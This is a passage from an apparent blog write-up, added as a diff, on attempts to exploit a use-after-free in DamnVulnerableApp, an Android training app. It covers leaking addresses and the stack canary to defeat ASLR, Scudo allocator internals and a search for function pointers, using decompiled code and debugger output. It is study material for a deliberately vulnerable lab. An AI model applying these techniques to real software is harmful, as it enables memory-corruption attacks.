+jlong &lt;span style="color:#f92672">**&lt;/span>ptrList;
+object &lt;span style="color:#f92672">*&lt;/span>keyValuePair;
+jsize keyLength;
+jbyte &lt;span style="color:#f92672">*&lt;/span>keyBytes;
+&lt;span style="color:#66d9ef">long&lt;/span> in_FS_OFFSET;
+uint reducedKeyLength;
+jboolean iscopy;
+&lt;span style="color:#66d9ef">long&lt;/span> canary;
+canary &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>);
+ptrList &lt;span style="color:#f92672">=&lt;/span> (jlong &lt;span style="color:#f92672">**&lt;/span>)malloc(&lt;span style="color:#ae81ff">0x108&lt;/span>);
+free(ptrList);
+keyValuePair &lt;span style="color:#f92672">=&lt;/span> (object &lt;span style="color:#f92672">*&lt;/span>)malloc(&lt;span style="color:#ae81ff">0x108&lt;/span>);
+keyLength &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetArrayLength)(env,key);
+reducedKeyLength &lt;span style="color:#f92672">=&lt;/span> (uint)keyLength;
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#ae81ff">0x100&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> reducedKeyLength) {
+reducedKeyLength &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x100&lt;/span>;
+}
+iscopy &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
+keyBytes &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetByteArrayElements)(env,key,&lt;span style="color:#f92672">&amp;amp;&lt;/span>iscopy);
+__memcpy_chk(keyValuePair,keyBytes,reducedKeyLength,&lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>);
+&lt;span style="color:#f92672">**&lt;/span>ptrList &lt;span style="color:#f92672">=&lt;/span> value;
+(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ReleaseByteArrayElements)(env,key,keyBytes,&lt;span style="color:#ae81ff">2&lt;/span>);
+free(keyValuePair);
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> canary) {
+&lt;span style="color:#66d9ef">return&lt;/span>;
+}
+&lt;span style="color:#75715e">/* WARNING: Subroutine does not return */&lt;/span>
+__stack_chk_fail();
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="trying-to-get-code-execution-in-useafterfreewritemodule">Trying to get code execution in &lt;em>UseAfterFreeWriteModule&lt;/em>&lt;/h2>
+&lt;p>In this section various approaches of getting code execution in the &lt;em>UseAfterFreeWriteModule&lt;/em> will be discussed. Although none of them are going to be applicable to this module, they might become relevant for future modules and definitely give some insights into binary exploitation on Android.&lt;/p>
+&lt;h3 id="leaking-data">Leaking data&lt;/h3>
+&lt;p>As is often the case with secured binaries, we have to defeat &lt;em>ASLR&lt;/em> by leaking some address. &amp;ldquo;Luckily&amp;rdquo;, there is a function that is called as often as we want, which is called &lt;code>lookupExamples&lt;/code> that contains the following code snippet:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">...
+length &lt;span style="color:#f92672">=&lt;/span> __strlen_chk(examples[(&lt;span style="color:#66d9ef">int&lt;/span>)index],&lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>);
+array &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>NewByteArray)(env,(jsize)length);
+(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion)(env,array,&lt;span style="color:#ae81ff">0&lt;/span>,(jsize)length,(jbyte &lt;span style="color:#f92672">*&lt;/span>)(examples &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)index));
+...
+&lt;span style="color:#66d9ef">return&lt;/span> array;
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>There are two aspects to consider:&lt;/p>
+&lt;ol>
+&lt;li>&lt;code>index&lt;/code> is not checked for &lt;em>out - of - bounds&lt;/em> access.&lt;/li>
+&lt;li>&lt;code>(jbyte *)(examples + (int)index)&lt;/code> will result in the address of a string being copied into &lt;code>array&lt;/code>. We know that &lt;code>examples&lt;/code> is probably a string table, because &lt;code>__strlen_chk&lt;/code> is called on &lt;code>examples[(int)index]&lt;/code>.&lt;/li>
+&lt;/ol>
+&lt;p>Interestingly, the &lt;em>out - of - bounds&lt;/em> access is &lt;strong>not&lt;/strong> really usable, because it requires &lt;code>examples[(int)index]&lt;/code> to be a valid pointer for &lt;code>index &amp;gt;= 4&lt;/code>. But there is no need to read more pointers, as the lengths of the strings in &lt;code>examples&lt;/code> determine the amount of bytes returned. Thus, for &lt;code>index = 3&lt;/code>, the leaked value will contain at least one address, if not more (it is a pretty long string).&lt;/p>
+&lt;p>&lt;code>lookupExamples&lt;/code> is called in a loop, where the user is asked for &lt;strong>1 - based&lt;/strong> indices into the array:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-Java" data-lang="Java">&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
+output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Send a number between 1 and 4 (0 to continue) to see one of four key name templates:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
+&lt;span style="color:#66d9ef">int&lt;/span> index &lt;span style="color:#f92672">=&lt;/span> ByteBuffer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">wrap&lt;/span>&lt;span style="color:#f92672">(&lt;/span>input&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#a6e22e">getInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
+&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>index &lt;span style="color:#f92672">==&lt;/span> 0&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
+&lt;span style="color:#66d9ef">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
+&lt;span style="color:#f92672">}&lt;/span>
+output&lt;span style="color:#f92672">(&lt;/span>lookupExamples&lt;span style="color:#f92672">(&lt;/span>index &lt;span style="color:#f92672">-&lt;/span> 1&lt;span style="color:#f92672">));&lt;/span>
+&lt;span style="color:#f92672">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>When accessing &lt;code>lookupExamples&lt;/code> by sending &lt;code>1 &amp;lt;= index &amp;lt;= 4&lt;/code> we can get the following leaks:&lt;/p>
+&lt;pre tabindex="0">&lt;code>[0]: 0x730b9b7a371e --|
+[1]: 0x730b9b7a372a | --&amp;gt; from `.rodata`, thus 0x730b9b7a371e - 0x71e = libUseAfterFreeWriteModule.so
+[2]: 0x730b9b7a3710 |
+[3]: 0x730b9b7a3735 --|
+[4]: 0x730b993ba990 --&amp;gt; stack address: array of example strings
+[5]: 0x2147eb93990de82b --&amp;gt; 8 byte canary
+[6]: 0x730b993ba8c0 --&amp;gt; stack address: stored `rbp`
+[7]: 0x730c0379ffac --&amp;gt; `art_quick_generic_jni_trampoline+220`, thus 0x730c0379fed0 = `art_quick_generic_jni_trampoline` and `libart.so = 0x730c03400000`
+&lt;/code>&lt;/pre>&lt;p>With the current leak, we get&lt;/p>
+&lt;ol>
+&lt;li>Address in &lt;code>libUseAfterFreeWriteModule.so&lt;/code> and therefore its base address&lt;/li>
+&lt;li>Address in &lt;code>libart.so&lt;/code> and therefore its base address&lt;/li>
+&lt;li>Address on stack&lt;/li>
+&lt;li>Canary&lt;/li>
+&lt;/ol>
+&lt;p>Keep in mind that everytime &lt;em>UseAfterFreeWriteModule&lt;/em> is run, the addresses will differ due to ASLR. The above leak is just an example to showcase what it might look like and, most importantly, what the semantics of the leaked values are.&lt;/p>
+&lt;h3 id="the-bug">The bug&lt;/h3>
+&lt;p>Before showing how to fail to exploit the bug &amp;hellip; well what is the bug anyways? Terms like &lt;em>Write - What - Where&lt;/em> condition have already been mentioned, so lets see the corresponding code:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">...
+ptrList &lt;span style="color:#f92672">=&lt;/span> (jlong &lt;span style="color:#f92672">**&lt;/span>)malloc(&lt;span style="color:#ae81ff">0x108&lt;/span>);
+free(ptrList);
+keyValuePair &lt;span style="color:#f92672">=&lt;/span> (object &lt;span style="color:#f92672">*&lt;/span>)malloc(&lt;span style="color:#ae81ff">0x108&lt;/span>);
+keyLength &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetArrayLength)(env,key);
+reducedKeyLength &lt;span style="color:#f92672">=&lt;/span> (uint)keyLength;
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#ae81ff">0x100&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> reducedKeyLength) {
+reducedKeyLength &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x100&lt;/span>;
+}
+iscopy &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
+keyBytes &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetByteArrayElements)(env,key,&lt;span style="color:#f92672">&amp;amp;&lt;/span>iscopy);
+__memcpy_chk(keyValuePair,keyBytes,reducedKeyLength,&lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>);
+&lt;span style="color:#f92672">**&lt;/span>ptrList &lt;span style="color:#f92672">=&lt;/span> value;
+...
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>As can be seen, immediately after allocating memory for a &lt;code>jlong*[33]&lt;/code>, the memory is freed. Then memory is allocated to hold a &lt;code>struct object&lt;/code> (this was deduced from analysis in &lt;em>Ghidra&lt;/em>; the name is chosen arbitrarily). Comparing both &lt;code>malloc&lt;/code> calls reveals that both types of the two variables are of the same size. If &lt;code>malloc&lt;/code> was to return the same chunk twice, whatever is stored in the first 8 bytes of the &lt;code>keyBytes&lt;/code> would be interpreted as a pointer, to which we would write the &lt;code>value&lt;/code>.&lt;/p>
+&lt;p>Knowing our beloved &lt;code>dlmalloc&lt;/code> (the glibc&amp;rsquo;s implementation of &lt;code>malloc&lt;/code>), we can assume that &lt;code>keyValuePair&lt;/code> will be assigned the same chunk as &lt;code>ptrList&lt;/code>, right? I.e. &lt;code>keyValuePair = ptrList&lt;/code>, where &lt;code>ptrList&lt;/code> is a dangling pointer, because its memory has already been freed? Well &amp;hellip; the interesting thing is that it actually works, i.e. &lt;code>keyValuePair = ptrList&lt;/code>, but this is &lt;strong>not due to dlmalloc&lt;/strong>!&lt;/p>
+&lt;p>Lets confirm my statement with some disassembly. To that end, observe that &lt;code>ptrList = *($rbp-0x58)&lt;/code> and &lt;code>keyValuePair = *($rbp-0x60)&lt;/code>:&lt;/p>
+&lt;pre tabindex="0">&lt;code>[1] gef➤ disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair
+...
+0x0000730b9ed59a1a &amp;lt;+42&amp;gt;: call 0x730b9ed59b80 &amp;lt;malloc@plt&amp;gt;
+0x0000730b9ed59a1f &amp;lt;+47&amp;gt;: mov QWORD PTR [rbp-0x58],rax &amp;lt;--- result of first malloc
+0x0000730b9ed59a23 &amp;lt;+51&amp;gt;: mov rdi,QWORD PTR [rbp-0x58]
+0x0000730b9ed59a27 &amp;lt;+55&amp;gt;: call 0x730b9ed59b90 &amp;lt;free@plt&amp;gt;
+0x0000730b9ed59a2c &amp;lt;+60&amp;gt;: mov edi,0x108
+0x0000730b9ed59a31 &amp;lt;+65&amp;gt;: call 0x730b9ed59b80 &amp;lt;malloc@plt&amp;gt;
+0x0000730b9ed59a36 &amp;lt;+70&amp;gt;: mov QWORD PTR [rbp-0x60],rax &amp;lt;--- result of second malloc
+...
+gef➤ x/1gx $rbp-0x58
+0x730b9c970828: 0x0000730cb77bb950
+gef➤ x/1gx $rbp-0x60
+0x730b9c970820: 0x0000730cb77bb950
+[2] gef➤ pipe vmmap | grep primary | grep cb77
+0x00730cb77b3000 0x00730cb77f3000 0x00000000000000 rw- [anon:scudo:primary]
+[3] gef➤ disassemble malloc
+Dump of assembler code for function malloc:
+0x0000730eb408fda0 &amp;lt;+0&amp;gt;: push r14
+0x0000730eb408fda2 &amp;lt;+2&amp;gt;: push rbx
+0x0000730eb408fda3 &amp;lt;+3&amp;gt;: push rax
+0x0000730eb408fda4 &amp;lt;+4&amp;gt;: mov r14,rdi
+0x0000730eb408fda7 &amp;lt;+7&amp;gt;: mov rax,QWORD PTR [rip+0x982a2] # 0x730eb4128050 &amp;lt;__libc_globals+80&amp;gt;
+0x0000730eb408fdae &amp;lt;+14&amp;gt;: test rax,rax
+0x0000730eb408fdb1 &amp;lt;+17&amp;gt;: jne 0x730eb408fdcb &amp;lt;malloc+43&amp;gt;
+0x0000730eb408fdb3 &amp;lt;+19&amp;gt;: call 0x730eb40950f0 &amp;lt;scudo_malloc&amp;gt;
+0x0000730eb408fdb8 &amp;lt;+24&amp;gt;: mov rbx,rax
+0x0000730eb408fdbb &amp;lt;+27&amp;gt;: test rax,rax
+0x0000730eb408fdbe &amp;lt;+30&amp;gt;: je 0x730eb408fdd0 &amp;lt;malloc+48&amp;gt;
+0x0000730eb408fdc0 &amp;lt;+32&amp;gt;: mov rax,rbx
+0x0000730eb408fdc3 &amp;lt;+35&amp;gt;: add rsp,0x8
+0x0000730eb408fdc7 &amp;lt;+39&amp;gt;: pop rbx
+0x0000730eb408fdc8 &amp;lt;+40&amp;gt;: pop r14
+0x0000730eb408fdca &amp;lt;+42&amp;gt;: ret
+0x0000730eb408fdcb &amp;lt;+43&amp;gt;: call QWORD PTR [rax+0x18]
+[4] gef➤ p/x 0x982a2 + 0x0000730eb408fdae
+$1 = 0x730eb4128050
+gef➤ x/1gx 0x730eb4128050
+0x730eb4128050 &amp;lt;__libc_globals+80&amp;gt;: 0x0000000000000000
+[5] gef➤ disassemble scudo_malloc
+Dump of assembler code for function scudo_malloc:
+0x0000730eb40950f0 &amp;lt;+0&amp;gt;: push rbx
+0x0000730eb40950f1 &amp;lt;+1&amp;gt;: mov rsi,rdi
+0x0000730eb40950f4 &amp;lt;+4&amp;gt;: lea rdi,[rip+0x9b5c5] # 0x730eb41306c0 &amp;lt;_ZL9Allocator&amp;gt;
+0x0000730eb40950fb &amp;lt;+11&amp;gt;: mov ecx,0x10
+0x0000730eb4095100 &amp;lt;+16&amp;gt;: xor edx,edx
+0x0000730eb4095102 &amp;lt;+18&amp;gt;: xor r8d,r8d
+0x0000730eb4095105 &amp;lt;+21&amp;gt;: call 0x730eb4094a20 &amp;lt;_ZN5scudo9AllocatorINS_13AndroidConfigEXadL_Z21scudo_malloc_postinitEEE8allocateEmNS_5Chunk6OriginEmb&amp;gt;
+0x0000730eb409510a &amp;lt;+26&amp;gt;: mov rbx,rax
+0x0000730eb409510d &amp;lt;+29&amp;gt;: test rax,rax
+0x0000730eb4095110 &amp;lt;+32&amp;gt;: je 0x730eb4095117 &amp;lt;scudo_malloc+39&amp;gt;
+0x0000730eb4095112 &amp;lt;+34&amp;gt;: mov rax,rbx
+0x0000730eb4095115 &amp;lt;+37&amp;gt;: pop rbx
+0x0000730eb4095116 &amp;lt;+38&amp;gt;: ret
+0x0000730eb4095117 &amp;lt;+39&amp;gt;: call 0x730eb411a850 &amp;lt;__errno@plt&amp;gt;
+0x0000730eb409511c &amp;lt;+44&amp;gt;: mov DWORD PTR [rax],0xc
+0x0000730eb4095122 &amp;lt;+50&amp;gt;: mov rax,rbx
+0x0000730eb4095125 &amp;lt;+53&amp;gt;: pop rbx
+0x0000730eb4095126 &amp;lt;+54&amp;gt;: ret
+&lt;/code>&lt;/pre>&lt;p>Lets digest what we just witnessed:&lt;/p>
+&lt;ol>
+&lt;li>Identifying the values of &lt;code>ptrList&lt;/code> and &lt;code>keyValuePair&lt;/code> and confirming that &lt;code>ptrList = keyValuePair&lt;/code>&lt;/li>
+&lt;li>Checking where &lt;code>ptrList&lt;/code> and &lt;code>keyValuePair&lt;/code> point to. They are pointing to some &lt;em>primary&lt;/em> location?&lt;/li>
+&lt;li>As we called &lt;code>malloc&lt;/code> to allocate memory, we quickly check its disassembly and observe that there is a call to &lt;code>scudo_malloc&lt;/code> in case there is a zero at &lt;code>rip + 0x982a2 = 0x0000730eb408fdae + 0x982a2&lt;/code>.&lt;/li>
+&lt;li>Verify that indeed &lt;code>scudo_malloc&lt;/code> is called. Btw. if &lt;code>rip + 0x982a2&lt;/code> pointed to a global memory region that is writable, we might be able to introduce our own, totally benign implementation of &lt;code>malloc&lt;/code>.&lt;/li>
+&lt;li>Check implementation of &lt;code>scudo_malloc&lt;/code>. It internally calls &lt;code>scudo::Allocator&amp;lt;...&amp;gt;::allocate&lt;/code> (using &lt;a href="https://man7.org/linux/man-pages/man1/c++filt.1.html">&lt;em>c++filt&lt;/em>&lt;/a> to demangle mangled names).&lt;/li>
+&lt;/ol>
+&lt;p>We can observe a similar behaviour for &lt;code>free&lt;/code>, which winds up to call &lt;code>scudo::Allocator&amp;lt;scudo::AndroidConfig, &amp;amp;(scudo_malloc_postinit)&amp;gt;::deallocate(void*, scudo::Chunk::Origin, unsigned long, unsigned long)&lt;/code>.&lt;/p>
+&lt;h4 id="introducing-scudo-the-allocator">Introducing &lt;em>Scudo&lt;/em>, the Allocator&lt;/h4>
+&lt;p>&lt;a href="https://source.android.com/docs/security/test/scudo">&lt;em>Scudo&lt;/em>&lt;/a> is an allocator that is used for all native code from Android 11 onwards. Its source code can be found &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/">here&lt;/a>.&lt;/p>
+&lt;p>We are going to take a practical approach, i.e. hunt down the functionality as quickly as possible to verify that &lt;code>ptrList = keyValuePair&lt;/code> was not a coincidence. To that end, I will only present small excerpts of code.&lt;/p>
+&lt;p>As seen &lt;a href="#the-bug">above&lt;/a>, &lt;code>scudo_malloc&lt;/code> calls &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=292">&lt;code>scudo::Allocator&amp;lt;...&amp;gt;::allocate(unsigned long, scudo::Chunk::Origin, unsigned long, bool)&lt;/code>&lt;/a>. Analyzing the implementation reveals:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">...
+&lt;span style="color:#66d9ef">if&lt;/span> (LIKELY(PrimaryT&lt;span style="color:#f92672">::&lt;/span>canAllocate(NeededSize))) {
+...
+Block &lt;span style="color:#f92672">=&lt;/span> TSD&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Cache.allocate(ClassId);
+...
+}
+...
+&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>Ptr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">reinterpret_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&amp;gt;&lt;/span>(UserPtr);
+&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>TaggedPtr &lt;span style="color:#f92672">=&lt;/span> Ptr;
+...
+&lt;span style="color:#66d9ef">return&lt;/span> TaggetPtr;
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>Ptr&lt;/code> is computed from &lt;code>Block&lt;/code>, but that is irrelevant for now. Tracing &lt;code>TSD-&amp;gt;Cache.allocate(ClassId)&lt;/code> gets us to the &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=70">implementation&lt;/a> we wanted to see:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">allocate&lt;/span>(uptr ClassId) {
+...
+PerClass &lt;span style="color:#f92672">*&lt;/span>C &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>PerClassArray[ClassId];
+...
+CompactPtrT CompactP &lt;span style="color:#f92672">=&lt;/span> C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Chunks[&lt;span style="color:#f92672">--&lt;/span>C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Count];
+...
+&lt;span style="color:#66d9ef">return&lt;/span> Allocator&lt;span style="color:#f92672">-&amp;gt;&lt;/span>decompactPtr(ClassId, CompactP);
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Reversing the type definitions shows that &lt;code>CompactPtrT = uintptr_t&lt;/code>, so its just a normal pointer. Finally, inspecting &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=135">&lt;code>PerClass&lt;/code>&lt;/a>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">PerClass&lt;/span> {
+u32 Count; &lt;span style="color:#75715e">// &amp;lt;-- amount of free chunks in block
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> u32 MaxCount; &lt;span style="color:#75715e">// &amp;lt;-- no idea
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> uptr ClassSize; &lt;span style="color:#75715e">// &amp;lt;-- size of a single chunk in bytes
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> CompactPtrT Chunks[&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">*&lt;/span> TransferBatch&lt;span style="color:#f92672">::&lt;/span>MaxNumCached]; &lt;span style="color:#75715e">// &amp;lt;-- chunks, freed and used
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>};
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Basically &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=70">&lt;code>SizeClassAllocatorLocalCache::allocate(uptr ClassId)&lt;/code>&lt;/a> will get the next free chunk by decreasing &lt;code>PerClass::Count&lt;/code> by 1 and taking this as an index into &lt;code>PerClass::Chunks&lt;/code>.&lt;/p>
+&lt;p>Similarly, for &lt;code>scudo_free&lt;/code>, we end up running &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=88">&lt;code>SizeClassAllocatorLocalCache::deallocate(uptr ClassId, void *P)&lt;/code>&lt;/a>(this is non - trivial to see, but is what actually happens):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">deallocate&lt;/span>(uptr ClassId, &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>P) {
+...
+PerClass &lt;span style="color:#f92672">*&lt;/span>C &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>PerClassArray[ClassId];
+...
+C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Chunks[C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Count&lt;span style="color:#f92672">++&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> Allocator&lt;span style="color:#f92672">-&amp;gt;&lt;/span>compactPtr(ClassId, &lt;span style="color:#66d9ef">reinterpret_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>uptr&lt;span style="color:#f92672">&amp;gt;&lt;/span>(P));
+...
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>This method frees a chunk by writing the compacted pointer back into the array and adding 1 to &lt;code>PerClass::Count&lt;/code>. Therefore, the sequence&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C"> &lt;span style="color:#66d9ef">struct&lt;/span> manager &lt;span style="color:#f92672">*&lt;/span>m &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">struct&lt;/span> manager&lt;span style="color:#f92672">*&lt;/span>)malloc(&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> manager));
+free(m);
+&lt;span style="color:#66d9ef">struct&lt;/span> object &lt;span style="color:#f92672">*&lt;/span>obj &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">struct&lt;/span> object&lt;span style="color:#f92672">*&lt;/span>)malloc(&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> object));
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>results in decrementing &lt;code>PerClass::Count&lt;/code> (w.r.t. corresponding class id), incrementing it and then decrementing it again while writing the same pointer. This is why we get that &lt;code>ptrList = keyValuePair&lt;/code>. Notice that there are probably optimizations in place that handle memory shortages etc. As &lt;em>DamnVulnerableApp&lt;/em> is the only app I run on the emulator, it might differ from what you get on a busy device.&lt;/p>
+&lt;h3 id="trying-to-exploit">Trying to exploit&lt;/h3>
+&lt;p>Lets recall the setting we are in:&lt;/p>
+&lt;ol>
+&lt;li>We are given a &lt;em>Write - What - Where&lt;/em> condition, which allows us to write anywhere we want. It is possible to write code and data, but notice that all writable memory regions (&lt;code>.bss&lt;/code>, &lt;code>.data&lt;/code>, &lt;code>stack&lt;/code>, &lt;code>heap&lt;/code>) are &lt;strong>not&lt;/strong> executable.&lt;/li>
+&lt;li>We have access to &lt;code>libart.so&lt;/code>, &lt;code>libUseAfterFreeWriteModule.so&lt;/code>, the stack and the canary.&lt;/li>
+&lt;/ol>
+&lt;p>The &lt;em>Goal&lt;/em>: Arbitrary Code Execution&lt;/p>
+&lt;h4 id="sniffing-out-function-pointers">Sniffing out function pointers&lt;/h4>
+&lt;p>The first idea is to find a sequence of function calls, for which we have suitable control over the parameters. Redirecting the pointers of those functions by e.g. overwriting the &lt;em>vtable&lt;/em> would allow to execute arbitrary functions that are &lt;em>resistent&lt;/em> to &lt;code>__thiscall&lt;/code>. This basically means that those functions do not use the first parameter at all or use it in a way that is beneficial to us.&lt;/p>
+&lt;p>Unfortunately, &lt;em>vtables&lt;/em> are located in a read - only section. This can be proven by observing that mangled &lt;em>vtable&lt;/em> names start with &amp;ldquo;_ZTV&amp;rdquo;. To be precise, only &lt;a href="https://itanium-cxx-abi.github.io/cxx-abi/abi-mangling.html">&amp;ldquo;TV&amp;rdquo;&lt;/a> indicates that this is a &lt;em>vtable&lt;/em>. Next, analysing all publicly available &lt;em>vtables&lt;/em>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ readelf --wide --symbols libart.so | grep &lt;span style="color:#e6db74">&amp;#34;_ZTV&amp;#34;&lt;/span>
+...
+13121: 0000000000c17e18 &lt;span style="color:#ae81ff">32&lt;/span> OBJECT WEAK PROTECTED &lt;span style="color:#ae81ff">16&lt;/span> _ZTVN3art32BuildNativeCallFrameStateMachineINS_26ComputeNativeCallFrameSizeEEE
+$ readelf --wide --sections libart.so
+...
